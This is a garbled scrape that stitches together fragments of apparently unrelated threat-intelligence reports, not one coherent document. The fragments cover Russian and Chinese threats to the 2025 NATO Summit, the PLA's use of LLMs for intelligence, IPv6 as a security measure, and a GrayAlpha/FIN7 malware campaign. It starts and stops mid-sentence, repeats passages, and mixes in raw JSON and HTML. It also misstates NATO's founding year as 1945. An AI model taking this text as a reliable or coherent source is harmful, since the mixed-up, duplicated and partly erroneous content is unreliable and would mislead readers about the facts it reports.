NATO Summit by portraying the alliance as aggressive, divisive, and divided.\nMalign influence actors, particularly from Russia, are likely to use artificial intelligence (AI)-generated media in an effort to discredit NATO leadership, delegitimize summit outcomes, and further inflame tensions among member states.\nCybercriminal and hacktivist activity referencing NATO has surged across dark web and special-access forums in the months leading up to the 2025 NATO Summit, very likely signaling a heightened risk of ideologically driven and financially motivated multi-vector campaigns targeting NATO member states and defense-affiliated entities.\nRussian state-aligned threat groups, particularly those linked to the SVR, FSB, and GRU, are highly likely to conduct targeted operations against entities and personnel associated with the 2025 NATO Summit.\nChinese state-sponsored groups tasked with the collection of foreign intelligence, particularly those under the Ministry of State Security, are likely to engage in some level of opportunistic cyber-espionage operations against select attendees with the goal of understanding summit-related policy discussions and outcomes.\nThe Netherlands’ extensive security posture around the 2025 NATO Summit will very likely mitigate the scope, sophistication, and impact of physical security threats to the event from violent non-state actors, including terrorists, violent extremists, criminal organizations, and disruptive protest movements.\nStrategic Threat Environment\n2025 NATO Summit Likely Pivotal for Alliance’s Future Unity\nThe 2025 NATO Summit comes at a time when the alliance’s ability to project unified geopolitical and military strength is likely more uncertain than any time in recent years, driven by US rhetoric questioning the alliance’s utility; rising political influence of Euroskeptic far right parties in several NATO member states; and Russia’s continued efforts to undermine NATO unity via its military campaign in Ukraine, and hybrid sabotage and influence operations in Europe.\nThe US government’s public messaging concerning its commitment to NATO has been inconsistent throughout President Donald Trump’s first and second terms. In 2025, President Trump suggested that the US’s commitment to Article 5 of NATO’s founding treaty would depend on a given NATO state’s defense spending, stating, “If they don’t pay, I’m not going to defend them.” In contrast, in 2017, President Trump stated, “Absolutely, I’d be committed to Article 5.”\nSecretary of State Marco Rubio announced that all NATO members will be expected to spend 5% of their GDP on defense over the next decade, an increase from the previous benchmark of 2%. Although Rubio emphasized that the US remains committed to supporting NATO, notes from an internal Trump Administration proposal revealed plans to reduce the amount of money the US would contribute to NATO’s budget. The US currently provides roughly 16% of the alliance’s funding.\nIn some key NATO states, the rising political influence of far-right parties that are skeptical of NATO and sympathetic to Russia likely complicates their ability to reinforce NATO commitments. For example, France’s Rassemblement National (RN) has historically advocated for France’s withdrawal from NATO. Though the RN has recently moderated its position, its historically anti-NATO position risks complicating French President Emmanuel Macron’s ability to achieve consensus on increased French defense spending for NATO. Germany’s Alternative für Deutschland (AfD) has questioned NATO’s continued utility and has advocated for closer Germany-Russia ties.\nDifferences in NATO states’ probable responses to Russia’s multi-pronged attempts to weaken NATO and its allies will almost certainly strain NATO’s ability to project a unified response to Russia’s actions. Though NATO has, from its founding in 1945, been primarily concerned with resisting Russian aggression, in the last two years, Russia has significantly escalated its aggression towards NATO and its allies, with Moscow’s full-scale invasion of Ukraine, escalating sabotage operations in NATO territory, and widespread influence operations aimed at undermining public confidence in Western democracy and manipulating elections in favor of pro-Russia candidates.\nProfiles of Key Players\nUnited States — Unpredictable NATO Leader\nInconsistent statements by senior US officials about NATO’s utility and how much to resist Russian aggression likely make it difficult to predict the US’s 2025 NATO Summit priorities, which will have significant influence over the tone of the summit and the text of the Summit Declaration. That said, the US almost certainly will call for NATO member states to spend 3.5 to 5% of their GDP on defense, judging from past statements by President Trump. The US is also likely to push for NATO’s increased focus on China-nexus threats to NATO territory, judging from the Trump administration’s emphasis on resisting Chinese global aggression. The US’s inconsistent policies toward Russia — ranging from supporting Russia’s view that Kyiv started the Russia-Ukraine war to calling for additional sanctions on Russia — make it difficult to predict the US’s stance on Russia at the summit. Reporting suggests senior NATO officials — including the NATO Secretary General — are considering deemphasizing Ukraine at the summit, potentially including not inviting Ukrainian President Volodymyr Zelensky, to avoid alienating President Trump. We assess this suggests that at least some NATO states might be willing to compromise on their priorities to ensure the US remains invested in the alliance.\nPoland — Concerns about Existential Threats from Moscow Drive Militarization\nPoland’s presidential election likely raises questions about Warsaw’s level of support for Ukraine at the 2025 NATO Summit and beyond. Law and Justice (PiS) candidate Karol Nawrocki won the runoff on June 2, 2025. Nawrocki has stated that he would veto Ukraine’s accession to NATO, suggesting Warsaw is likely to be less inclined to support additional NATO aid to Ukraine. However, Nawrocki is likely to remain committed to building up Poland’s military capabilities to resist Russian aggression. Warsaw’s history of being invaded by Russia and Putin’s rhetoric undermining Poland’s sovereignty almost certainly have led Poland to conclude that NATO strength is one of the only deterrents to Russian aggression within Poland, potentially including territorial incursions. Polish leaders have announced plans to increase the size of Poland’s standing army from 200,000 to 500,000 and provide military training to every Polish man.\nUnited Kingdom — Member of Pro-NATO Unity Bloc\nThe United Kingdom (UK) is likely to strongly advocate for continued NATO unity to resist threats, including an increase in NATO assistance to Ukraine. The UK has announced a commitment to increase its defense spending to 2.5% of its GDP by 2030. Notably, UK Prime Minister Keir Starmer has backed NATO membership for Ukraine despite US objections, suggesting there could be tension between the US and UK on this issue at the summit.\nGermany — Member of Pro-NATO Unity Bloc\nGermany is likely to be more committed to NATO unity and increased defense spending than it has in previous NATO summits, as it adopts a position similar to that of the UK and France. Senior German officials have pledged to spend 5% of Germany’s GDP on defense. Merz’s government voted to revise Germany’s constitution to allow increased defense spending and facilitate the largest German rearmament since World War II. Chancellor Merz has also expressed support for Ukraine joining NATO, though he has rejected the idea of sending NATO troops to Ukraine.\nFrance — Member of Pro-NATO Unity Bloc\nFrance’s position at the 2025 NATO Summit is likely to be broadly similar to that of the UK and Germany. French President Emmanuel Macron has advocated for NATO states to increase their defense spending to 3 to 3.5% of their GDPs. France has called for “credible security guarantees” for Ukraine via a coordinated NATO strategy, including a pathway for Ukraine to join NATO. Macron is also likely to advocate for the expansion of nuclear deterrence measures to strengthen NATO’s defenses.\nHungary — Efforts to Balance NATO Membership with Close Russia Relations Complicate NATO Unity\nHungary is likely to take a multifaceted approach that aims to balance participation in core NATO functions, including defense spending targets and collective defense mechanisms, with avoiding providing direct military assistance to Ukraine, likely to preserve Hungary’s relationship with Russia. Hungary has met NATO’s longtime 2% defense spending target, though its efforts to maintain a positive relationship with Russia are likely to complicate NATO’s ability to project a unified response to Russian aggression. Hungary’s plans to determine a way to avoid operations outside of NATO territory suggest it could complicate NATO responses to conflicts, even outside of the Russia-Ukraine war.\nTürkiye — Pivotal Independent Player, Most Well-Positioned to Influence NATO Priorities\nTürkiye’s strong military and unique diplomatic positioning to broker talks with Western powers as well as Russia and China means it likely feels empowered to push NATO to adopt Turkish priorities. For example, Türkiye initially opposed Swedish admission into NATO due to Sweden providing asylum for members of the Kurdistan Workers’ Party, a political party Ankara considers a terrorist organization. Türkiye eventually agreed to Swedish admission into NATO after securing key concessions from the US, including F-16 fighter jets.\nTürkiye announced plans in October 2024 to increase its defense and security spending in 2025 to $47 billion, its highest-ever military budget. Ankara has offered up its services as a mediator in the Russia-Ukraine war, though Ankara’s often close relations with Moscow make it unclear to what extent Türkiye would be able to be a neutral arbiter between Moscow and Kyiv. More broadly, Türkiye is likely to seek NATO support for its own national priorities, including counterterrorism, as well as a lifting of NATO arms embargoes on Türkiye, which Ankara argues undermines Turkish defense capabilities.\nHybrid Threats to NATO Member States\nRussian hybrid threats –– including sabotage of critical infrastructure, vandalism, weaponized migration, and coercive military posture –– will very likely continue to target European countries ahead of and following the 2025 NATO Summit. While these operations are unlikely to directly target the summit event itself, threats to the critical infrastructure of NATO member countries are likely heightened as Moscow seeks to destabilize member states and exploit divisions within the alliance. Hybrid threats will almost certainly increase their targeting of NATO member countries following the summit if it results in significant action regarding Ukraine, such as a joint commitment to further military aid to Kyiv. In January 2025, the Finnish Defence Forces assessed that Russia “will likely increase the use of all hybrid methods as it seeks to cause disunity within NATO and the European Union,” including cyber and information influencing, coercive use of energy exports, targeting of energy and other critical infrastructure, weaponizing immigration, and intelligence operations.\nRussian Hybrid Warfare Units\nInsikt Group identified at least five Russian units dedicated to hybrid warfare operations, including sabotage, assassinations, arson attacks, espionage, and recruitment of foreign agents (Table 1). The Kremlin also very likely employs individuals not directly affiliated with its security or intelligence services to conduct hybrid threat activity, in an effort to prevent discovery and complicate attribution. For example, GRU Military Unit 54654 very likely recruits operatives without prior military contracts or connections to the Russian government to avoid identification, including recruiting foreign students studying in Russia, Russian students abroad, and criminal organizations in Russia and abroad.\nRecent arrests and incidents of potential sabotage across Europe indicate that recruits are largely young men, Russian-speaking but not Russian citizens, often with a criminal background and recruited via Telegram. For example, Polish Foreign Minister Radek Sikorski stated in an interview that Russia used Telegram to recruit the perpetrators of the May 2024 arson attacks on a Warsaw shopping mall. In March 2025, the Finnish Defence Forces assessed that “attempts to recruit human sources online, and particularly on pro-Russian social media platforms, are likely to become more common.” Similarly, Moscow can also likely co-opt vessels affiliated with its shadow fleet to conduct low-sophistication destructive actions targeting submarine infrastructure, such as anchor dragging, as these assets likely draw less scrutiny.\nEntity\nHierarchy\nOperations\nDepartment of Special Tasks (Департамент специальных задач)\nEstablished in 2023 by GRU Deputy Director Andrey Vladimirovich Averyanov and Ivan Sergeevich Kas’ianenko\nEncompasses GRU units 29155 and 54654\nReportedly responsible for a planned assassination plot targeting Rheinmetall CEO Armin Papperger and explosives planted at DHL logistics centers in 2024\nGRU Unit 29155 (в/ч 29155)\nNow under the Department of Special Tasks; led by Averyanov\nReportedly involved in bounties on US soldiers in Afghanistan, the 2018 Skripal poisoning and sabotage operations; linked to cyber espionage and Russian influence network CopyCop\nGRU Unit 54654 (в/ч 54654)\nNow under Department of Special Tasks\nRecruits operatives without prior military or government connections; behind “illegals” intelligence programs\nGRU Unit 54777 (в/ч 54777)\nAlso known as the 72nd Special Service Center\nConducts psychological operations; exploited Ukraine peace demonstrations in Germany to influence public opinion\nMain Directorate of Deep Sea Research (Главное управление глубоководных исследований, GUGI)\nReports directly to the Ministry of Defense; naval base in Olenya Bay\nVery likely involved in submarine infrastructure surveillance and sabotage; maintains at least eight nuclear submarines and thirteen ships, including the Yantar, which hosts two deep-sea submarines\nTable 1: Formal Russian government entities affiliated with sabotage or hybrid threat operations (Source: Recorded Future)\nSabotage\nRussia very likely aims to target European critical infrastructure with hybrid cyber-kinetic operations, regardless of the outcome of current peace negotiations on Ukraine. Based on recent incidents, countries neighboring Russia –– Estonia, Finland, Latvia, Lithuania, and Poland –– likely represent the most attractive targets for sabotage operations. Additionally, countries providing the strongest support to Ukraine, such as Germany and Poland, are almost certainly at greater risk of physical threats than countries that do not provide significant aid, such as Hungary, which Moscow is unlikely to directly target. Specifically, Insikt Group assessed in April 2025 that Russia’s threat perception and intent to target European energy entities would likely increase following the European Union (EU)’s announcement of a framework to eliminate Russian fossil fuel imports by 2027.\nRussia-directed sabotage attacks targeting the critical infrastructure and key government and military facilities of European countries have almost certainly increased since 2022. Recent incidents suggest that these operations largely involve low-sophistication tactics with a degree of plausible deniability and obfuscated links to Moscow, often initially appearing as accidents or single criminal events, complicating attribution and identification of a larger strategic trend. For example, in March 2025, Polish prosecutors announced that an alleged Belarusian refugee masquerading as an opposition activist had set fire to a Warsaw supermarket on Russia’s behalf in April 2024, and Lithuanian prosecutors attributed an arson attack on an Ikea store in Vilnius in May 2024 to two teenagers recruited by Russia’s Main Directorate of the General Staff of the Armed Forces (GRU). In December 2024, the Federal Prosecutor’s Office in Germany announced charges against three Russian-German nationals for reportedly surveying a US military base in Grafenwöhr, a weapons factory in Bayreuth, and military facilities and railway lines to support sabotage operations using explosives. According to the Center for Strategic and International Studies (CSIS), Russia-directed sabotage attacks in Europe tripled between 2023 and 2024 (from 12 to 34 attacks), after quadrupling between 2022 and 2023 (from 3 to 12 attacks).\nThreats to Submarine Cable Infrastructure\nSabotage operations targeting submarine cables off the coast of Europe almost certainly represent a relatively low-effort, high-reward vector for targeting European critical infrastructure. In June 2023, Insikt Group assessed that Russia’s ongoing war against Ukraine was very likely fueling physical attacks and intelligence collection efforts against the submarine cable system to undermine the economic, diplomatic, and national security objectives of the US and its NATO allies. Specifically, Russia almost certainly presents the greatest direct threat to submarine cables in the North and Baltic Seas.\nInsikt Group identified four incidents involving damage to eight submarine cables in the Baltic Sea in 2024 and 2025: January 2025 damages to the C-Lion1 cable connecting Germany and Finland; January 2025 damages to the Sweden-Latvia cable; December 2024 damages to four submarine internet cables (likely the Finland Estonia Connection 1, Finland Estonia Connection 2, Baltic Sea Submarine Cable, and C-Lion1) and the Estlink-2 power cable; and November 2024 damages to the C-Lion1 and BCS East-West Interlink. Prosecutors have attributed these damages to vessels, some with connections to Russia, dragging their anchors; for example, the Eagle S vessel behind the December 2024 cable cuts is suspected to be part of Russia’s shadow fleet and reportedly carried surveillance equipment. While none of these incidents caused prolonged outages or communication disruptions due to the availability of alternate routes for data transmission, increased societal concerns about the vulnerability of critical infrastructure had a clear psychological impact on northern European populations. A more coordinated attack on submarine critical infrastructure could cause disruptions to business operations, financial losses, and communications disruptions, raising the risk of economic ramifications to northern and eastern Europe. In 2024, Estonian power provider Elering reported that energy bills spiked by 10% due to a technical problem with a power cable, with board member Erkki Sapp stating that energy infrastructure can handle any single event, but “if there are several of these sorts of events, then this may lead to issues with security of supply.”\nIn addition to threats to critical infrastructure, Moscow has very likely attempted to weaponize refugee flows in an effort to foment domestic unrest and exploit concerns about immigration in countries bordering Russia and Belarus. In October 2024, Poland temporarily suspended asylum rights for migrants entering the country via Belarus, over concerns that Russia had orchestrated an influx of migrants at that border as part of hybrid tactics to destabilize Poland. Similarly, Finland closed its last border crossing with Russia in November 2023 after accusing Moscow of facilitating the crossing of approximately 1,000 migrants without valid documentation. Throughout 2021 and 2022, Lithuania documented similar efforts by the Belarusian government to push migrants across the border. As such, the weaponization of migration across Russian and Belarusian borders with NATO member states, particularly Finland, Poland, Estonia, Latvia, and Lithuania, likely remains a viable tactic to attempt to destabilize these countries.\nCoercive Military Posture\nRussia’s plans to expand its military capabilities near the border with Finland and the Baltic states will very likely focus on increasing military presence and intelligence capabilities. Moscow’s ability to implement these changes has been constrained by its ongoing military operations in Ukraine, although it has already taken several key steps in 2024 –– most notably, the creation of the Leningrad Military District bordering Finland and the Baltics, which Moscow frames as its response to NATO expansion. Russia reportedly aims to increase the size of its armed forces by 350,000 by 2026, of which up to 50,000 will deploy to the Leningrad Military District, potentially increasing troop numbers near Finland from approximately 30,000 to 80,000. While Finnish and Latvian intelligence services have assessed that planned troop increases will not be completed for several years, Russia will very likely seek to ramp up implementation of military reforms should the conflict in Ukraine decrease in intensity, focusing on increasing military presence and capabilities in its northwestern regions.\nIn addition to expanding its military capabilities along NATO member state borders, Russian coercive military actions via incursions into NATO airspace will also likely increase ahead of the 2025 NATO Summit. In April 2024, the foreign ministers of Estonia, Latvia, Lithuania, Finland, and Sweden met to discuss growing global positioning system (GPS) interference in the region, which Estonian Foreign Minister Margus Tsahkna attributed to Russia and which Insikt Group assessed would continue through then-ongoing STEADFAST DEFENDER 2024 military exercises. In its annual report in May 2025, Latvia’s Military Intelligence and Security Service (MIDD) reported that Russia has increasingly been monitoring NATO activity in the Baltic Sea and engaging in acts such as unauthorized airspace violations, in a likely attempt to intimidate, test NATO responses, and discredit regional defense capabilities.\nTo read the entire analysis, click here to download the report as a PDF.","enclosure":{"length":"0","type":"image/jpg","url":"https://www.recordedfuture.com/research/media_187e0225d6baebdc619352f8ce8f4f3674541b9c3.png?width=1200&format=pjpg&optimize=medium"},"content":"Explore how state-sponsored actors, cybercriminals, and hacktivists are targeting the 2025 NATO Summit.

Both the PLA and China’s defense industry have very likely adapted foreign and domestic large language models (LLMs) to develop specialized models that can effectively carry out intelligence tasks. The PLA and China’s defense industry have created generative AI-based intelligence tools that can reportedly process and analyze intelligence data, generate intelligence products, answer questions, provide recommendations, facilitate early warning, and support decision-making, among other functions. These tools are broadly intended to improve the speed, efficiency, accuracy, and scale of intelligence tasks while reducing costs. Though elements of the PLA have expressed optimism about the benefits of generative AI and are likely taking initial steps to apply this technology to intelligence work, the PLA has very likely recognized the limitations and risks of this technology. Consequently, the extent to which the PLA will integrate generative AI into intelligence activities — and the ultimate effectiveness of this integration — remains unclear.</p>\n        <p>The PLA’s interest in using generative AI to support military intelligence presents challenges for both the PLA and the West. For the PLA, given the limitations and risks of generative AI, successful adoption of this technology will require experimenting with the intelligence applications of generative AI, accurately assessing the outcomes of these experiments, and appropriately applying generative AI to intelligence work based on these outcomes and assessments; failure to do so could result in inaccurate intelligence that degrades the quality of decision-making. Moreover, if PLA intelligence analysts use generative AI models that were developed to conform with Chinese Communist Party (CCP) ideology or trained on ideologically biased analytical products, the PLA risks reducing the objectivity of intelligence analysis. For the West, the PLA’s application of generative AI to intelligence work creates technology transfer challenges and highlights the risk of Chinese counterintelligence organizations using generative AI to generate inauthentic but convincing information to mislead Western intelligence analysts and degrade the intelligence value of open-source information.</p>\n        <h2>Key Findings</h2>\n        <ul>\n          <li>PLA media and researchers affiliated with the PLA have argued that the application of generative AI to military intelligence has a wide range of potential benefits, including improving the collection and analysis of intelligence and providing enhanced decision-making capabilities to military commanders, but have also recognized various challenges and risks associated with using this technology for intelligence work.</li>\n          <li>Likely realizing the intelligence limitations of general-purpose generative AI models, the PLA and China’s defense industry are likely prioritizing the development and use of specialized models that have been fine-tuned for intelligence tasks.</li>\n          <li>The PLA and China’s defense industry have very likely used a mix of proprietary and open-source LLMs from foreign and domestic developers to create generative AI-based intelligence tools. Foreign LLMs used this way very likely include models from Meta, OpenAI, and BigScience, among others, while domestic LLMs very likely include models from DeepSeek, Tsinghua University, Zhipu AI, and Alibaba Cloud, among others.</li>\n          <li>PLA patent applications reveal that the PLA has designed methods and systems that use generative AI to facilitate intelligence tasks such as generating open-source intelligence (OSINT) products, processing satellite imagery, supporting event extraction, and processing event data.</li>\n          <li>In a patent application filed in December 2024, a Chinese state-owned defense industry research institute proposed using OSINT, human intelligence (HUMINT), signals intelligence (SIGINT), geospatial intelligence (GEOINT), and technical intelligence (TECHINT) data to train a military LLM to specialize in intelligence tasks, purportedly enabling the enhanced military LLM to support every phase of the intelligence cycle and improve decision-making during military operations.</li>\n          <li>The PLA and China’s defense industry have likely procured generative AI technology to support OSINT and science and technology (S&amp;T) intelligence, an indicator that at least some elements of China’s military are likely beginning to apply generative AI to intelligence tasks.</li>\n          <li>The PLA — which very likely rapidly adopted DeepSeek’s generative AI models in early 2025 — is likely using DeepSeek’s LLMs for intelligence purposes, based on claims by a Chinese defense contractor that it has provided a DeepSeek-based OSINT model to the PLA.</li>\n          <li>The PLA is likely concerned that foreign counterintelligence organizations could use generative AI to produce convincing inauthentic content to mislead Chinese intelligence personnel and degrade the intelligence value of open-source information. Chinese counterintelligence organizations could apply generative AI in a similar manner.</li>\n        </ul>\n        <h2>Methodology</h2>\n        <p>To assess the PLA’s views on and application of generative AI in intelligence work, Insikt Group collected and analyzed articles published in PLA media, academic research authored by PLA personnel, PLA and Chinese defense industry patent applications, PLA and Chinese defense industry procurement records, information published by Chinese defense contractors, and data available in the Recorded Future® Platform, among other sources. The sources cited in the report do not necessarily represent official PLA policies related to generative AI; rather, they demonstrate how individuals and organizations situated within the PLA and China’s defense industry are likely exploring and developing the intelligence applications of generative AI. This report does not assess the veracity of technical claims from the PLA and China’s defense industry, but entities that develop or sell intelligence-related generative AI tools likely have an incentive to exaggerate the effectiveness of generative AI and downplay its deficiencies, so information provided by these entities should be viewed with skepticism.</p>\n        <p>Generative AI is a broad term, and some of its subcategories lack clear boundaries, which occasionally created challenges for this investigation. In some instances, we observed references to generative AI models like LLMs being used for possible non-generative functions; we assessed these references were still relevant to our investigation. Moreover, Chinese sources frequently use the term “large model” (大模型) when discussing AI models rather than more specific terms like “LLM.” Not all large models are considered to be generative AI, so we did not automatically assume that every reference to a “large model” was related to generative AI.

The authors contend that generative AI is profoundly affecting the creation and application of knowledge, including national defense S&amp;T intelligence. They claim that generative AI has the potential to improve intelligence collection, evaluation, analysis, and generation (see <strong>Figure 1</strong>), detailing how generative AI could assist intelligence personnel rather than asserting that this technology could replace intelligence personnel.

Both the PLA and China’s defense industry have very likely adapted foreign and domestic large language models (LLMs) to develop specialized models that can effectively carry out intelligence tasks. The PLA and China’s defense industry have created generative AI-based intelligence tools that can reportedly process and analyze intelligence data, generate intelligence products, answer questions, provide recommendations, facilitate early warning, and support decision-making, among other functions. These tools are broadly intended to improve the speed, efficiency, accuracy, and scale of intelligence tasks while reducing costs. Though elements of the PLA have expressed optimism about the benefits of generative AI and are likely taking initial steps to apply this technology to intelligence work, the PLA has very likely recognized the limitations and risks of this technology. Consequently, the extent to which the PLA will integrate generative AI into intelligence activities — and the ultimate effectiveness of this integration — remains unclear.\nThe PLA’s interest in using generative AI to support military intelligence presents challenges for both the PLA and the West. For the PLA, given the limitations and risks of generative AI, successful adoption of this technology will require experimenting with the intelligence applications of generative AI, accurately assessing the outcomes of these experiments, and appropriately applying generative AI to intelligence work based on these outcomes and assessments; failure to do so could result in inaccurate intelligence that degrades the quality of decision-making. Moreover, if PLA intelligence analysts use generative AI models that were developed to conform with Chinese Communist Party (CCP) ideology or trained on ideologically biased analytical products, the PLA risks reducing the objectivity of intelligence analysis. For the West, the PLA’s application of generative AI to intelligence work creates technology transfer challenges and highlights the risk of Chinese counterintelligence organizations using generative AI to generate inauthentic but convincing information to mislead Western intelligence analysts and degrade the intelligence value of open-source information.\nKey Findings\nPLA media and researchers affiliated with the PLA have argued that the application of generative AI to military intelligence has a wide range of potential benefits, including improving the collection and analysis of intelligence and providing enhanced decision-making capabilities to military commanders, but have also recognized various challenges and risks associated with using this technology for intelligence work.\nLikely realizing the intelligence limitations of general-purpose generative AI models, the PLA and China’s defense industry are likely prioritizing the development and use of specialized models that have been fine-tuned for intelligence tasks.\nThe PLA and China’s defense industry have very likely used a mix of proprietary and open-source LLMs from foreign and domestic developers to create generative AI-based intelligence tools. Foreign LLMs used this way very likely include models from Meta, OpenAI, and BigScience, among others, while domestic LLMs very likely include models from DeepSeek, Tsinghua University, Zhipu AI, and Alibaba Cloud, among others.\nPLA patent applications reveal that the PLA has designed methods and systems that use generative AI to facilitate intelligence tasks such as generating open-source intelligence (OSINT) products, processing satellite imagery, supporting event extraction, and processing event data.\nIn a patent application filed in December 2024, a Chinese state-owned defense industry research institute proposed using OSINT, human intelligence (HUMINT), signals intelligence (SIGINT), geospatial intelligence (GEOINT), and technical intelligence (TECHINT) data to train a military LLM to specialize in intelligence tasks, purportedly enabling the enhanced military LLM to support every phase of the intelligence cycle and improve decision-making during military operations.\nThe PLA and China’s defense industry have likely procured generative AI technology to support OSINT and science and technology (S&T) intelligence, an indicator that at least some elements of China’s military are likely beginning to apply generative AI to intelligence tasks.\nThe PLA — which very likely rapidly adopted DeepSeek’s generative AI models in early 2025 — is likely using DeepSeek’s LLMs for intelligence purposes, based on claims by a Chinese defense contractor that it has provided a DeepSeek-based OSINT model to the PLA.\nThe PLA is likely concerned that foreign counterintelligence organizations could use generative AI to produce convincing inauthentic content to mislead Chinese intelligence personnel and degrade the intelligence value of open-source information. Chinese counterintelligence organizations could apply generative AI in a similar manner.\nMethodology\nTo assess the PLA’s views on and application of generative AI in intelligence work, Insikt Group collected and analyzed articles published in PLA media, academic research authored by PLA personnel, PLA and Chinese defense industry patent applications, PLA and Chinese defense industry procurement records, information published by Chinese defense contractors, and data available in the Recorded Future® Platform, among other sources. The sources cited in the report do not necessarily represent official PLA policies related to generative AI; rather, they demonstrate how individuals and organizations situated within the PLA and China’s defense industry are likely exploring and developing the intelligence applications of generative AI. This report does not assess the veracity of technical claims from the PLA and China’s defense industry, but entities that develop or sell intelligence-related generative AI tools likely have an incentive to exaggerate the effectiveness of generative AI and downplay its deficiencies, so information provided by these entities should be viewed with skepticism.\nGenerative AI is a broad term, and some of its subcategories lack clear boundaries, which occasionally created challenges for this investigation. In some instances, we observed references to generative AI models like LLMs being used for possible non-generative functions; we assessed these references were still relevant to our investigation. Moreover, Chinese sources frequently use the term “large model” (大模型) when discussing AI models rather than more specific terms like “LLM.” Not all large models are considered to be generative AI, so we did not automatically assume that every reference to a “large model” was related to generative AI. We only classified a reference to a “large model” as generative AI when other information confirmed the model’s generative nature. Appendix A provides a glossary of generative AI terminology for readers unfamiliar with this technology.\nViews on Generative AI in Military Intelligence\nPLA Daily\nThe PLA’s official paper, PLA Daily, has published a handful of articles that directly discuss the intelligence implications of generative AI, which are summarized in Table 1. These articles discuss the potential benefits of generative AI for military intelligence, highlighting the supposed ability of this technology to generate intelligence products, predict changes on the battlefield, facilitate intelligence activities during both peacetime and wartime, improve the efficiency of intelligence analysis, and provide decision-making support to commanders. These articles also note potential challenges associated with generative AI, suggesting that generative AI models cannot replace up-to-date intelligence and warning that the intelligence agencies of competing countries could exploit deepfakes to interfere with rival agencies.\nDate\nSummary\nAugust 2024\nPLA Daily published an article on large generative AI models in operational command and control, which contends that large models can generate intelligence briefs, extract intelligence main points, and predict changes in the battlefield situation. However, the article also suggests that large models cannot replace up-to-date intelligence information, arguing that these models can function as encyclopedias but can only query information from their training data. As such, large models reportedly depend on up-to-date intelligence information to analyze and judge the battlefield situation, organize and integrate intelligence products, and connect and mine intelligence knowledge.\nApril 2023\nPLA Daily published an article on the military applications of ChatGPT, which describes ChatGPT as having intelligence applications in both peacetime and wartime. In peacetime, ChatGPT can reportedly serve as a virtual assistant to help analysts analyze the massive amount of information available on the internet, improving the efficiency of analysis and mining hidden high-value intelligence. In wartime, ChatGPT can reportedly integrate large amounts of battlefield intelligence into a comprehensive battlefield situation report automatically, reducing the workload of intelligence personnel and improving the intelligence analysis and planning capabilities of combat personnel.\nMarch 2023\nPLA Daily published an article on ChatGPT that predicts combatants will have strong intelligence collection capabilities and near-real-time information perception capabilities in “future informatized and intelligentized wars.” To this point, the article notes that ChatGPT could be used for basic work such as data analysis, decision-making support, and natural language processing, qualitatively improving commanders’ decision-making capabilities through mass battlefield information processing.\nJune 2020\nThe PLA Daily published an article on the dangers of deepfake technology that warns deepfakes could be used to interfere with intelligence work. The article warns that the intelligence agencies of competing countries could use deepfakes to interfere with rival agencies and set limits on the scope of their operations.\nTable 1: Summary of PLA Daily articles that discuss the intelligence implications of generative AI (Source: PLA Daily; Insikt Group)\nAcademic Research\nPLA researchers — especially personnel affiliated with the Academy of Military Science (AMS; 军事科学院) Military Science Information Research Center (MSIRC; 军事科学信息研究中心) — have expressed optimism about the intelligence applications of generative AI but have also recognized the fallibility of this technology, raising a variety of issues associated with applying generative AI to intelligence work.

In addition to two days of phenomenal vibe coding in Cursor, the final presentations were light on hyperbole and heavy on capabilities and remarkable outcomes, created in a day or less. Two years ago, when LLMs made their mainstream debut, I was dubious, but the hackathon confirmed recent observations (last three months) that AI is accelerating security workflows (like everything else) at warp speed. Change, soon driven primarily through various agentic flavors, is happening at a pace that is difficult to comprehend.\nThe flight home was spent considering how to get ahead of the adversarial/defensive agent wars that will soon play out across the internet. Given the vast amount of uncertainty in agentic implementations and scale, there are no perfect solutions, but there are architecture scenarios worth considering NOW. Principal among them is IPv6. Long a headache for architects and engineers (nibble boundaries anyone?), IPv6 may now represent real business value through security, in exchange for the considerable effort. AI is a natural forcing function here. Given the time required to implement IPv6 and resolve the inevitable challenges along the way, enterprises should begin the work, aided by AI, of course.\nWhy IPv6 Belongs in Your Five-Year Security Roadmap\nWhat if eliminating opportunistic attacks required nothing more than updating your network architecture?

Organizations dismissing this advantage miss a critical opportunity to reduce their attack surface while security teams fight multi-front battles against AI-powered threats.\nThe Opportunistic Threat Reality\nRecorded Future tracks thousands of automated exploitation campaigns daily, following a predictable pattern. Vulnerability disclosure triggers mass scanning within hours, leading to indiscriminate compromise of exposed systems.\nRecent campaigns demonstrate the scale:\nCVE-2025-31324 (SAP NetWeaver): 581 systems compromised via mass scanning; 1,800+ targets identified\nCVE-2024-3400 (PAN-OS): thousands of compromised devices in 72 hours\nCVE-2023-4966 (CitrixBleed): Over 20,000 servers breached via automated scanning\nCVE-2023-34362 (MOVEit Transfer): 2500 instances exposed to the internet; initial access through internet-wide vulnerability discovery\nThe volume metrics paint a sobering picture.

This newly identified infrastructure includes domains used for payload distribution and additional IP addresses believed to be tied to GrayAlpha. Insikt Group discovered a custom PowerShell loader named PowerNet, which decompresses and executes NetSupport RAT. Insikt Group identified another custom loader, referred to as MaskBat, that has similarities to FakeBat but is obfuscated and contains strings linked to GrayAlpha. Overall, Insikt Group found three primary infection methods: fake browser update pages, fake 7-Zip download sites, and the traffic distribution system (TDS) TAG-124. Notably, the use of TAG-124 had not been publicly documented prior to this report. Although all three infection vectors were observed being used simultaneously, only the fake 7-Zip download pages were still active at the time of writing, with newly registered domains appearing as recently as April 2025. Further analysis of these sites led to the identification of an individual who may be involved in the GrayAlpha operation.</p>\n        <p>In the near term, defenders are advised to enforce application allow-lists to block the download of seemingly legitimate files that contain malware. Where allow-lists are not practical, comprehensive employee security training becomes essential, particularly in recognizing suspicious behaviors such as unexpected prompts for browser updates or redirects caused by malvertising. Additionally, the use of detection rules, such as the YARA rules and Malware Intelligence Hunting queries provided in this report, is critical for identifying both existing and past infections. These rules should be updated frequently and supported with broader detection techniques, including monitoring of network artifacts and using Recorded Future Network Intelligence, due to the constantly evolving nature of malware.</p>\n        <p>Looking ahead, defenders must monitor the broader cybercriminal ecosystem to anticipate and respond to emerging threats more effectively. The continued professionalization of cybercrime increases the likelihood of organizations across multiple industries being targeted. This trend is driven by the sustained profitability of cybercrime, limited international law enforcement collaboration, and the continuous evolution of security technologies, which in turn drive innovation among threat actors. While advanced persistent threat (APT) activity is often linked to state-sponsored entities, GrayAlpha illustrates that cybercriminal groups can demonstrate a similar level of persistence. Much like the ransomware-as-a-service (RaaS) model, cybercriminals are becoming increasingly specialized and collaborative, making it imperative to adopt a comprehensive and adaptive security posture.</p>\n        <h2>Key Findings</h2>\n        <ul>\n          <li>Insikt Group has identified new infrastructure linked to GrayAlpha — a threat actor overlapping with the group commonly known as FIN7 — including domains utilized for payload distribution and additional IP addresses believed to be part of the threat actor's infrastructure.</li>\n          